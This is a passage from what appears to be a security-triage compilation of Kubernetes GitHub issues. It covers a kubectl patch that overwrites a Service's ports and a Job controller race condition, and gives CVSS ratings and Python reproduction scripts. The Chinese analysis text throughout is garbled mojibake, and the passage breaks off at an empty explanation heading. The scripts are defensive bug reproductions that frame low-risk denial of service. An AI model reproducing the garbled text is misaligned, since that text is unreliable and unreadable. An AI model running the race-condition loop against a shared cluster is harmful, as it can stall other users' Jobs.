  creationTimestamp: "2025-05-23T05:47:19Z"
  name: kube-bench-dev
  namespace: default
  resourceVersion: "636672"
  uid: 68caa0ca-fce7-4100-b5db-78901ccdf896
spec:
  clusterIP: 172.16.0.64
  clusterIPs:
  - 172.16.0.64
  internalTrafficPolicy: Cluster
  ipFamilies:
  - IPv4
  ipFamilyPolicy: SingleStack
  ports:
  - name: tcp-80
    port: 80
    protocol: TCP
    targetPort: 80
  selector:
    instance: kube-bench-dev
  sessionAffinity: None
  type: ClusterIP
status:
  loadBalancer: {}
```

kubectl patch svc kube-bench-dev -p '{"spec":{"ports":[{"name":"udp-80","protocol":"UDP","port":80,"targetPort":80}]}}':
```yaml
apiVersion: v1
kind: Service
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Service","metadata":{"annotations":{},"name":"kube-bench-dev","namespace":"default"},"spec":{"ports":[{"name":"tcp-80","port":80,"protocol":"TCP","targetPort":80}],"selector":{"instance":"kube-bench-dev"}}}
  creationTimestamp: "2025-05-23T05:47:19Z"
  name: kube-bench-dev
  namespace: default
  resourceVersion: "636741"
  uid: 68caa0ca-fce7-4100-b5db-78901ccdf896
spec:
  clusterIP: 172.16.0.64
  clusterIPs:
  - 172.16.0.64
  internalTrafficPolicy: Cluster
  ipFamilies:
  - IPv4
  ipFamilyPolicy: SingleStack
  ports:
  - name: udp-80
    port: 80
    protocol: UDP
    targetPort: 80
  selector:
    instance: kube-bench-dev
  sessionAffinity: None
  type: ClusterIP
status:
  loadBalancer: {}
```

#### Kubernetes version
```console
$ kubectl version
Client Version: v1.33.1
Kustomize Version: v5.6.0
Server Version: v1.33.1
```

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesä¸­ä½¿ç”¨`kubectl patch`å‘½ä»¤æ›´æ–°Serviceèµ„æºæ—¶çš„è¡Œä¸ºã€‚å½“ç”¨æˆ·å°è¯•ä¸ºä¸€ä¸ªå·²å­˜åœ¨TCPç«¯å£çš„Serviceæ·»åŠ ä¸€ä¸ªç«¯å£å·ç›¸åŒä½†åè®®ä¸åŒçš„UDPç«¯å£æ—¶ï¼ŒåŸæœ‰çš„TCPç«¯å£è¢«è¦†ç›–ï¼Œè€Œä¸æ˜¯æ–°å¢ä¸€ä¸ªç«¯å£ã€‚

è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒåœ¨äº`kubectl patch`å‘½ä»¤é»˜è®¤ä½¿ç”¨çš„è¡¥ä¸ç­–ç•¥ã€‚å½“ä¸æŒ‡å®š`--type`å‚æ•°æ—¶ï¼Œ`kubectl patch`å¯¹Kuberneteså†…ç½®èµ„æºï¼ˆå¦‚Serviceï¼‰é€šå¸¸ä½¿ç”¨"strategic merge patch"ç­–ç•¥ã€‚ç„¶è€Œï¼Œç”¨æˆ·æä¾›çš„patch ` -p '{"spec":{"ports":[...]' ` å®é™…ä¸Šæ˜¯ä¸€ä¸ª"JSON merge patch" (RFC 7396)ã€‚æ ¹æ®JSON merge patchçš„è§„èŒƒï¼Œå¦‚æœè¡¥ä¸ä¸­çš„å­—æ®µæ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆå¦‚æ­¤å¤„çš„`ports`ï¼‰ï¼Œå®ƒä¼šå®Œå…¨æ›¿æ¢æ‰ç›®æ ‡å¯¹è±¡ä¸­åŸæœ‰çš„æ•´ä¸ªæ•°ç»„ã€‚ç”¨æˆ·çš„æœŸæœ›æ˜¯å‘`ports`æ•°ç»„ä¸­è¿½åŠ ä¸€ä¸ªå…ƒç´ ï¼Œä½†è¿™éœ€è¦ä½¿ç”¨"JSON patch" (RFC 6902)å¹¶æŒ‡å®š`add`æ“ä½œï¼Œæˆ–è€…åœ¨"strategic merge patch"ä¸­æ­£ç¡®åœ°æä¾›é”®æ¥åˆå¹¶åˆ—è¡¨ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªè¡Œä¸ºæœ¬èº«æ˜¯Kubernetes APIæœåŠ¡å™¨å’Œ`kubectl`å·¥å…·æŒ‰è®¾è®¡å·¥ä½œçš„è¡¨ç°ï¼Œå¹¶éä¸€ä¸ªä¼ ç»Ÿæ„ä¹‰ä¸Šçš„è½¯ä»¶æ¼æ´ã€‚ç„¶è€Œï¼Œè¿™ç§è¡Œä¸ºå¯èƒ½è¢«æ»¥ç”¨ï¼Œå¯¼è‡´å®‰å…¨é£é™©ã€‚ä¸€ä¸ªæ‹¥æœ‰`patch` Serviceæƒé™çš„æ”»å‡»è€…ï¼ˆæˆ–æ¶æ„å†…éƒ¨äººå‘˜ï¼‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæ•…æ„å‘é€ä¸€ä¸ªåªåŒ…å«éƒ¨åˆ†ç«¯å£çš„è¡¥ä¸ï¼Œä»è€Œç§»é™¤æœåŠ¡ä¸Šå…¶ä»–å…³é”®çš„ç«¯å£ï¼Œå¯¼è‡´ä¾èµ–è¿™äº›è¢«ç§»é™¤ç«¯å£çš„åº”ç”¨æˆ–æœåŠ¡ä¸­æ–­ï¼Œè¿™æ„æˆäº†ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡åŒæ—¶æš´éœ²äº†TCP 80ï¼ˆHTTPï¼‰å’ŒTCP 443ï¼ˆHTTPSï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªåªåŒ…å«TCP 80ç«¯å£çš„patchï¼Œæ¥ç¦ç”¨HTTPSæœåŠ¡ï¼Œè¿«ä½¿ç”¨æˆ·æµé‡é™çº§åˆ°ä¸å®‰å…¨çš„HTTPã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜å¯ä»¥å¯¼è‡´å®‰å…¨é£é™©ï¼ˆæ‹’ç»æœåŠ¡ï¼‰ã€‚
2.  æ”»å‡»è€…éœ€è¦å…·å¤‡ä¿®æ”¹Serviceèµ„æºçš„æƒé™ï¼ˆä¾‹å¦‚ï¼ŒKubernetes RBACä¸­çš„`edit`è§’è‰²æƒé™ï¼‰ã€‚æ ¹æ®è§„åˆ™ #5ï¼Œâ€œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚
3.  è¯¥æ”»å‡»ä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒæˆ–å®¹å™¨é€ƒé€¸ç­‰é«˜å±åæœã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè™½ç„¶æ­¤è¡Œä¸ºå¯èƒ½å¯¼è‡´æœåŠ¡ä¸­æ–­ï¼Œä½†ç”±äºå®ƒéœ€è¦æ”»å‡»è€…é¢„å…ˆæ‹¥æœ‰è¾ƒé«˜çš„æƒé™ï¼ˆä¿®æ”¹æƒé™ï¼‰ï¼Œå› æ­¤é£é™©ç­‰çº§è¢«è§†ä¸ºä½é£é™©ã€‚

CVSS 3.1 è¯„åˆ†: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L` -> **3.8 (Low)**

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import yaml
from kubernetes import client, config
from kubernetes.client.rest import ApiException
from contextlib import suppress
import sys
import threading

def main():
    """
    ä¸»å‡½æ•°ï¼Œç”¨äºæ¼”ç¤º Kubernetes service ç«¯å£è¦†ç›–é—®é¢˜ã€‚
    """
    # è®¾ç½®ä¸€ä¸ª2åˆ†é’Ÿçš„å…¨å±€è¶…æ—¶
    timer = threading.Timer(120.0, lambda: sys.exit("[TIMEOUT] Script execution exceeded 2 minutes."))
    timer.start()

    # ä»é»˜è®¤ä½ç½®åŠ è½½ Kubernetes é…ç½®
    try:
        config.load_kube_config()
        print("[*] Kubernetes é…ç½®åŠ è½½æˆåŠŸã€‚")
    except config.ConfigException:
        print("[ERROR] æ— æ³•åŠ è½½ Kubernetes é…ç½®ã€‚è¯·æ£€æŸ¥ kubeconfig æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–é…ç½®æ­£ç¡®ã€‚")
        timer.cancel()
        return

    api = client.CoreV1Api()
    service_name = "kube-bench-dev-poc"
    namespace = "default"

    # å®šä¹‰åŒ…å« TCP ç«¯å£çš„åˆå§‹æœåŠ¡
    service_body = {
        "apiVersion": "v1",
        "kind": "Service",
        "metadata": {
            "name": service_name
        },
        "spec": {
            "selector": {
                "app": "my-app-poc"  # è™šæ‹Ÿé€‰æ‹©å™¨
            },
            "ports": [
                {
                    "name": "tcp-80",
                    "protocol": "TCP",
                    "port": 80,
                    "targetPort": 80
                }
            ]
        }
    }

    # å®šä¹‰ç”¨äº patch çš„ bodyï¼Œå…¶ä¸­åªåŒ…å« UDP ç«¯å£ã€‚
    # æ ¹æ® JSON Merge Patch è§„èŒƒï¼Œè¿™å°†æ›¿æ¢æ•´ä¸ª 'ports' åˆ—è¡¨ã€‚
    patch_body = {
        "spec": {
            "ports": [
                {
                    "name": "udp-80",
                    "protocol": "UDP",
                    "port": 80,
                    "targetPort": 80
                }
            ]
        }
    }

    try:
        print(f"[*] å‡†å¤‡åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºæœåŠ¡ '{service_name}'...")
        api.create_namespaced_service(namespace=namespace, body=service_body)
        print(f"[+] æœåŠ¡ '{service_name}' åˆ›å»ºæˆåŠŸã€‚")

        # ç­‰å¾…ç‰‡åˆ»ï¼Œç¡®ä¿æœåŠ¡å·²å®Œå…¨æ³¨å†Œ
        time.sleep(3)

        print("\n[*] Patch å‰ï¼Œè¯»å–æœåŠ¡ä¿¡æ¯...")
        service_before = api.read_namespaced_service(name=service_name, namespace=namespace)
        print("--- Patch å‰çš„ç«¯å£é…ç½® ---")
        # ä½¿ç”¨ pyyaml ç¾åŒ–è¾“å‡º
        print(yaml.dump([p.to_dict() for p in service_before.spec.ports]))

        print(f"[*] å¼€å§‹ Patch æœåŠ¡ '{service_name}'ï¼Œå°è¯•æ·»åŠ  UDP ç«¯å£...")
        api.patch_namespaced_service(name=service_name, namespace=namespace, body=patch_body)
        print("[+] æœåŠ¡ Patch æ“ä½œå®Œæˆã€‚")

        # ç­‰å¾…ç‰‡åˆ»ï¼Œç¡®ä¿ patch å·²ç”Ÿæ•ˆ
        time.sleep(3)

        print("\n[*] Patch åï¼Œå†æ¬¡è¯»å–æœåŠ¡ä¿¡æ¯...")
        service_after = api.read_namespaced_service(name=service_name, namespace=namespace)
        print("--- Patch åçš„ç«¯å£é…ç½® ---")
        print(yaml.dump([p.to_dict() for p in service_after.spec.ports]))

        # éªŒè¯ç»“æœ
        final_ports = service_after.spec.ports
        if len(final_ports) == 1 and final_ports[0].protocol == "UDP":
            print("\n[SUCCESS] å¤ç°æˆåŠŸï¼šåŸæœ‰çš„ TCP ç«¯å£è¢«æ–°çš„ UDP ç«¯å£è¦†ç›–ï¼Œè€Œéå…±å­˜ã€‚")
        else:
            print("\n[FAILURE] å¤ç°å¤±è´¥ï¼šè¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ã€‚")

    except ApiException as e:
        print(f"\n[ERROR] K8s API æ“ä½œå¼‚å¸¸: {e.reason}")
        # API å¼‚å¸¸æ—¶ï¼Œbody é€šå¸¸æ˜¯ JSON å­—ç¬¦ä¸²ï¼Œç›´æ¥æ‰“å°
        if e.body:
            print(f"è¯¦ç»†ä¿¡æ¯: {e.body}")
    except Exception as e:
        print(f"\n[ERROR] å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        print(f"\n[*] æ¸…ç†èµ„æºï¼šåˆ é™¤æœåŠ¡ '{service_name}'...")
        # ä½¿ç”¨ suppress å¿½ç•¥ NotFound é”™è¯¯ï¼Œä»¥é˜²æœåŠ¡åˆ›å»ºå¤±è´¥æˆ–å·²è¢«æ‰‹åŠ¨åˆ é™¤
        with suppress(ApiException):
            api.delete_namespaced_service(name=service_name, namespace=namespace)
            print(f"[+] æœåŠ¡ '{service_name}' å·²åˆ é™¤ã€‚")
        # ä»»åŠ¡å®Œæˆï¼Œå–æ¶ˆè¶…æ—¶å®šæ—¶å™¨
        timer.cancel()


# æ‰§è¡Œä¸»å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ä½¿ç”¨å®˜æ–¹çš„`kubernetes`å®¢æˆ·ç«¯åº“æ¥å¤ç°Issueä¸­æè¿°çš„é—®é¢˜ã€‚è„šæœ¬çš„ä¸»è¦ä½œç”¨æ˜¯è¯æ˜å½“ä½¿ç”¨ä¸€ä¸ªä»…åŒ…å«æ–°ç«¯å£ä¿¡æ¯çš„JSONå¯¹è±¡å»patchä¸€ä¸ªKubernetes Serviceæ—¶ï¼ŒServiceåŸæœ‰çš„`ports`åˆ—è¡¨ä¼šè¢«å®Œå…¨æ›¿æ¢ï¼Œè€Œä¸æ˜¯è¿½åŠ ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **åˆå§‹åŒ–**: è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ä»¥è·å–ä¸Kubernetesé›†ç¾¤äº¤äº’çš„å‡­è¯ã€‚åŒæ—¶å¯åŠ¨ä¸€ä¸ª2åˆ†é’Ÿçš„è¶…æ—¶å®šæ—¶å™¨ï¼Œé˜²æ­¢è„šæœ¬æ„å¤–æŒ‚èµ·ã€‚
2.  **åˆ›å»ºService**: å®šä¹‰ä¸€ä¸ªåä¸º`kube-bench-dev-poc`çš„Serviceï¼Œå®ƒåˆå§‹æ—¶åªæš´éœ²ä¸€ä¸ªTCPçš„80ç«¯å£ã€‚ç„¶åè°ƒç”¨`create_namespaced_service`åœ¨`default`å‘½åç©ºé—´ä¸­åˆ›å»ºè¯¥æœåŠ¡ã€‚
3.  **éªŒè¯åˆå§‹çŠ¶æ€**: åˆ›å»ºæœåŠ¡åï¼Œè„šæœ¬ä¼šæš‚åœå‡ ç§’é’Ÿï¼Œç„¶åè°ƒç”¨`read_namespaced_service`è¯»å–è¯¥æœåŠ¡çš„å½“å‰çŠ¶æ€ï¼Œå¹¶æ‰“å°å‡ºå…¶`ports`é…ç½®ï¼Œè¯æ˜TCPç«¯å£å·²æˆåŠŸåˆ›å»ºã€‚
4.  **æ‰§è¡ŒPatch**: è„šæœ¬æ¥ç€è°ƒç”¨`patch_namespaced_service`æ–¹æ³•ï¼Œä½¿ç”¨ä¸€ä¸ªåªåŒ…å«UDP 80ç«¯å£çš„`patch_body`æ¥æ›´æ–°æœåŠ¡ã€‚è¿™ä¸ªæ“ä½œæ¨¡æ‹Ÿäº†Issueä¸­`kubectl patch`å‘½ä»¤çš„è¡Œä¸ºã€‚
5.  **éªŒè¯æœ€ç»ˆçŠ¶æ€**: Patchæ“ä½œå®Œæˆåï¼Œè„šæœ¬å†æ¬¡è¯»å–æœåŠ¡çŠ¶æ€ï¼Œå¹¶æ‰“å°å‡ºæ›´æ–°åçš„`ports`é…ç½®ã€‚
6.  **ç»“æœæ–­è¨€**: è„šæœ¬æ£€æŸ¥æœ€ç»ˆçš„ç«¯å£åˆ—è¡¨ã€‚å¦‚æœåˆ—è¡¨ä¸­åªå‰©ä¸‹ä¸€ä¸ªUDPç«¯å£ï¼Œè¯´æ˜åŸæœ‰çš„TCPç«¯å£è¢«æˆåŠŸè¦†ç›–ï¼Œé—®é¢˜å¤ç°æˆåŠŸã€‚å¦åˆ™ï¼Œæ‰“å°å¤±è´¥ä¿¡æ¯ã€‚
7.  **æ¸…ç†**: åœ¨`finally`å—ä¸­ï¼Œæ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤åˆ›å»ºçš„Serviceèµ„æºï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚åŒæ—¶ï¼Œå–æ¶ˆè¶…æ—¶å®šæ—¶å™¨ã€‚

é€šè¿‡è¿è¡Œæ­¤è„šæœ¬ï¼Œå¯ä»¥æ¸…æ™°åœ°è§‚å¯Ÿåˆ°Serviceçš„`ports`æ•°ç»„è¢«æ•´ä½“æ›¿æ¢çš„è¡Œä¸ºï¼Œä»è€ŒéªŒè¯äº†è¯¥Issueæ‰€æè¿°çš„ç°è±¡ã€‚

---


## Issue #131917 recreate job with same template immediately may cause the new job not create pod

- Issue é“¾æ¥ï¼š[#131917](https://github.com/kubernetes/kubernetes/issues/131917)

### Issue å†…å®¹

#### What happened?

this problem may appear as followsï¼š
1. job1 with name job-test create
2. job Controller sync job1ï¼Œ created pod1ï¼Œ and set expectations.ExpectCreations
3. delete job1
4. recreate job2 with the same name job-test
5. job1 deletetion triggers jobController sync job1,  but `jobLister.Jobs(ns).Get(name)` got job2, so `expectations.DeleteExpectations` not be called
6. pod1 creation triggers `addPod` handler, but could not `resolveControllerRef` because job1 has been deleted and the job.uid changed, `expectations.CreationObserved` not be called
7. job controller sync job2, expectations.SatisfiedExpectations return false, so the new pod could not be created forever

#### What did you expect to happen?

pod could be created for recreated job

#### How can we reproduce it (as minimally and precisely as possible)?

1. create job
2. delete job
3. recreate the same job

low probability


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesä¸­ä¸Jobèµ„æºç›¸å…³çš„ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰é—®é¢˜ã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š

1.  å½“ä¸€ä¸ªJobï¼ˆä¾‹å¦‚ `job1`ï¼‰è¢«åˆ›å»ºæ—¶ï¼ŒJobæ§åˆ¶å™¨ä¼šä¸ºå…¶åˆ›å»ºPodï¼Œå¹¶è®¾ç½®ä¸€ä¸ªâ€œåˆ›å»ºæœŸæœ›â€ï¼ˆExpectationï¼‰ï¼Œè¡¨ç¤ºå®ƒæœŸæœ›ä¸€ä¸ªPodè¢«åˆ›å»ºã€‚
2.  å¦‚æœåœ¨ `job1` çš„Podåˆ›å»ºäº‹ä»¶è¢«æ§åˆ¶å™¨å®Œå…¨å¤„ç†ä¹‹å‰ï¼Œç”¨æˆ·è¿…é€Ÿåœ°åˆ é™¤äº† `job1` å¹¶ç«‹å³ç”¨ç›¸åŒçš„åå­—åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„Jobï¼ˆ`job2`ï¼‰ã€‚
3.  Jobæ§åˆ¶å™¨å¤„ç† `job1` çš„åˆ é™¤äº‹ä»¶æ—¶ï¼Œé€šè¿‡åç§°æŸ¥è¯¢å¯èƒ½ä¼šè·å–åˆ°æ–°çš„ `job2`ã€‚ç”±äº `job1` å’Œ `job2` çš„UIDä¸åŒï¼Œæ§åˆ¶å™¨ä¸ä¼šæ¸…é™¤ä¸ `job1` å…³è”çš„â€œåˆ›å»ºæœŸæœ›â€ã€‚
4.  å½“ `job1` å¯¹åº”çš„Podï¼ˆ`pod1`ï¼‰çš„åˆ›å»ºäº‹ä»¶åˆ°è¾¾æ—¶ï¼Œç”±äºå…¶Owner `job1` å·²è¢«åˆ é™¤ï¼Œæ§åˆ¶å™¨æ— æ³•è§£æå…¶å½’å±ï¼Œå› æ­¤ä¹Ÿä¸ä¼šè§‚å¯Ÿåˆ°è¿™ä¸ªåˆ›å»ºäº‹ä»¶æ¥æ»¡è¶³ä¹‹å‰çš„â€œåˆ›å»ºæœŸæœ›â€ã€‚
5.  æœ€ç»ˆï¼Œå½“Jobæ§åˆ¶å™¨åŒæ­¥ `job2` æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥ä¸è¯¥Jobåç§°å…³è”çš„â€œæœŸæœ›â€ã€‚ç”±äº `job1` ç•™ä¸‹çš„â€œåˆ›å»ºæœŸæœ›â€ä»æœªè¢«æ»¡è¶³æˆ–æ¸…é™¤ï¼Œæ§åˆ¶å™¨ä¼šè®¤ä¸ºå·²ç»æœ‰ä¸€ä¸ªPodæ­£åœ¨ä¸ºè¿™ä¸ªåå­—çš„Jobåˆ›å»ºä¸­ï¼Œå› æ­¤æ‹’ç»ä¸º `job2` åˆ›å»ºæ–°çš„Podã€‚
6.  è¿™å¯¼è‡´ `job2` æ°¸ä¹…åœ°å¤„äºç­‰å¾…çŠ¶æ€ï¼Œæ— æ³•åˆ›å»ºå…¶åº”æœ‰çš„Podï¼Œä»è€Œé€ æˆäº†é’ˆå¯¹è¯¥ç‰¹å®šJobçš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰ã€‚

æ”»å‡»è€…éœ€è¦æ‹¥æœ‰åœ¨ç‰¹å®šå‘½åç©ºé—´å†…åˆ›å»ºå’Œåˆ é™¤Jobçš„æƒé™ã€‚è™½ç„¶è¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼ˆå¯ç”¨æ€§ï¼‰ï¼Œä½†å…¶è§¦å‘æ¡ä»¶è‹›åˆ»ï¼Œéœ€è¦ç²¾ç¡®çš„æ—¶é—´æ§åˆ¶ï¼Œå±äºç«æ€æ¡ä»¶ï¼Œå¤ç°æ¦‚ç‡è¾ƒä½ã€‚å…¶å½±å“èŒƒå›´ä»…é™äºè¢«é‡å¤åˆ›å»ºçš„å•ä¸ªJobï¼Œä¸ä¼šå½±å“é›†ç¾¤ä¸­çš„å…¶ä»–å·¥ä½œè´Ÿè½½æˆ–å¯¼è‡´æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ç­‰æ›´ä¸¥é‡çš„é—®é¢˜ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network** - æ”»å‡»é€šè¿‡Kubernetes APIè¿›è¡Œã€‚
*   **Attack Complexity (AC): High** - é—®é¢˜æè¿°ä¸ºâ€œlow probabilityâ€ï¼Œè¡¨æ˜æˆåŠŸåˆ©ç”¨éœ€è¦ç²¾ç¡®çš„æ—¶åºï¼Œåˆ©ç”¨éš¾åº¦é«˜ã€‚
*   **Privileges Required (PR): Low** - æ”»å‡»è€…éœ€è¦åˆ›å»ºå’Œåˆ é™¤Jobçš„æƒé™ï¼Œè¿™åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­é€šå¸¸è¢«è®¤ä¸ºæ˜¯è¾ƒä½çš„æƒé™ï¼ˆç›¸å¯¹äºé›†ç¾¤ç®¡ç†å‘˜ï¼‰ã€‚
*   **User Interaction (UI): None** - ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged** - æ¼æ´å½±å“ä»…é™äºJobèµ„æºæœ¬èº«ï¼Œæœªå½±å“åˆ°å…¶ä»–ç»„ä»¶ã€‚
*   **Confidentiality (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
*   **Integrity (I): None** - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
*   **Availability (A): Low** - ä»…å½±å“å•ä¸ªJobçš„å¯ç”¨æ€§ï¼Œå¯ä»¥é€šè¿‡æ›´æ”¹Jobåç§°æ¥è§„é¿ã€‚

ç»¼åˆè¯„åˆ†ä¸º **3.1**ï¼Œå±äºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
import sys
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def create_job_manifest(job_name):
    """åˆ›å»ºä¸€ä»½Jobçš„å®šä¹‰ï¼ˆmanifestï¼‰"""
    container = client.V1Container(
        name="pi",
        image="perl:5.34.0",
        command=["perl", "-Mbignum=bpi", "-wle", "print bpi(2000)"],
    )
    template = client.V1PodTemplateSpec(
        metadata=client.V1ObjectMeta(labels={"job-name": job_name}),
        spec=client.V1PodSpec(restart_policy="Never", containers=[container]),
    )
    spec = client.V1JobSpec(
        template=template,
        backoff_limit=4
    )
    job = client.V1Job(
        api_version="batch/v1",
        kind="Job",
        metadata=client.V1ObjectMeta(name=job_name),
        spec=spec,
    )
    return job

def cleanup_job(batch_v1_api, core_v1_api, job_name, namespace):
    """æ¸…ç†æŒ‡å®šçš„JobåŠå…¶å…³è”çš„Pod"""
    try:
        # ä½¿ç”¨ foreground ç­–ç•¥ç¡®ä¿å…³è”çš„ pods ä¹Ÿè¢«åˆ é™¤
        delete_options = client.V1DeleteOptions(propagation_policy="Foreground")
        batch_v1_api.delete_namespaced_job(name=job_name, namespace=namespace, body=delete_options)
        # ç­‰å¾… Job åˆ é™¤å®Œæˆ
        for _ in range(10):
            try:
                batch_v1_api.read_namespaced_job(name=job_name, namespace=namespace)
                time.sleep(1)
            except ApiException as e:
                if e.status == 404:
                    break
        print(f"Cleanup: Job '{job_name}' deleted.")
    except ApiException as e:
        if e.status != 404:
            print(f"Cleanup: Error deleting job '{job_name}': {e}", file=sys.stderr)

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°ï¼Œå°è¯•å¤ç°æ¼æ´"""
    try:
        config.load_kube_config()
    except config.ConfigException:
        print("æ— æ³•åŠ è½½ kubeconfigï¼Œè¯·ç¡®ä¿æ‚¨çš„ç¯å¢ƒä¸­å·²é…ç½®å¥½Kubernetesé›†ç¾¤çš„è®¿é—®å‡­è¯ã€‚", file=sys.stderr)
        sys.exit(1)

    batch_v1 = client.BatchV1Api()
    core_v1 = client.CoreV1Api()

    namespace = "default"
    # ä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„åå­—ï¼Œåœ¨å¤šæ¬¡å°è¯•ä¸­ä¿æŒä¸€è‡´
    job_name = f"poc-race-job-{uuid.uuid4().hex[:6]}"
    job_manifest = create_job_manifest(job_name)

    timeout = 120  # 2åˆ†é’Ÿè¶…æ—¶
    start_time = time.time()
    reproduced = False
    attempt = 0

    print(f"Starting POC for Job race condition. Will run for a maximum of {timeout} seconds.")
    print(f"Using Job name: '{job_name}' in namespace '{namespace}'.")

    # åœ¨å¼€å§‹å‰æ‰§è¡Œä¸€æ¬¡æ¸…ç†ï¼Œä»¥é˜²ä¸Šæ¬¡è¿è¡Œæ„å¤–æ®‹ç•™
    cleanup_job(batch_v1, core_v1, job_name, namespace)

    while time.time() - start_time < timeout:
        attempt += 1
        print(f"\n--- Attempt {attempt} ---")
        try:
            # 1. ç¬¬ä¸€æ¬¡åˆ›å»º Job
            batch_v1.create_namespaced_job(body=job_manifest, namespace=namespace)
            print(f"Step 1: Created job '{job_name}'")

            # 2. ç«‹å³åˆ é™¤ Job (ä½¿ç”¨åå°åˆ é™¤ç­–ç•¥ä»¥åŠ é€Ÿè¿”å›)
            delete_options = client.V1DeleteOptions(propagation_policy="Background")
            batch_v1.delete_namespaced_job(name=job_name, namespace=namespace, body=delete_options)
            print(f"Step 2: Immediately deleted job '{job_name}'")

            # 3. ç«‹å³å†æ¬¡åˆ›å»ºåŒå Job
            batch_v1.create_namespaced_job(body=job_manifest, namespace=namespace)
            print(f"Step 3: Immediately recreated job '{job_name}'")

            # 4. ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œè®©æ§åˆ¶å™¨æœ‰æœºä¼šï¼ˆæˆ–å¤±è´¥ï¼‰åˆ›å»ºPod
            print("Waiting 20 seconds to check for Pod creation...")
            time.sleep(20)

            # 5. æ£€æŸ¥æ–° Job æ˜¯å¦æˆåŠŸåˆ›å»ºäº† Pod
            pods = core_v1.list_namespaced_pod(
                namespace=namespace, label_selector=f"job-name={job_name}"
            )

            if not pods.items:
                print(f"\n[SUCCESS] Vulnerability reproduced on attempt {attempt}!")
                print(f"The recreated job '{job_name}' failed to create any pods.")
                reproduced = True
                break
            else:
                print(f"Result: Pod was created successfully. Race condition not triggered this time.")
                # æ¸…ç†ä»¥ä¾¿è¿›è¡Œä¸‹ä¸€æ¬¡å°è¯•
                cleanup_job(batch_v1, core_v1, job_name, namespace)
                time.sleep(2) # çŸ­æš‚é—´éš”é¿å…APIé™æµ

        except ApiException as e:
            # åœ¨å¿«é€Ÿè¿ç»­æ“ä½œä¸­ï¼Œå¯èƒ½ä¼šé‡åˆ°409 Conflictç­‰é”™è¯¯ï¼Œè¿™å¾ˆæ­£å¸¸
            if e.status == 409:
                print(f"API conflict detected, which is expected during race attempts. Retrying...")
            else:
                print(f"An unexpected API error occurred: {e.status} - {e.reason}", file=sys.stderr)
            # æ¸…ç†åé‡è¯•
            cleanup_job(batch_v1, core_v1, job_name, namespace)
            time.sleep(5)

    if not reproduced:
        print(f"\n[FAILURE] Could not reproduce the vulnerability within the {timeout} second timeout.")
    
    # æœ€ç»ˆæ¸…ç†
    print("Performing final cleanup...")
    cleanup_job(batch_v1, core_v1, job_name, namespace)


main()
```


**è§£é‡Šè¯´æ˜ï¼š**

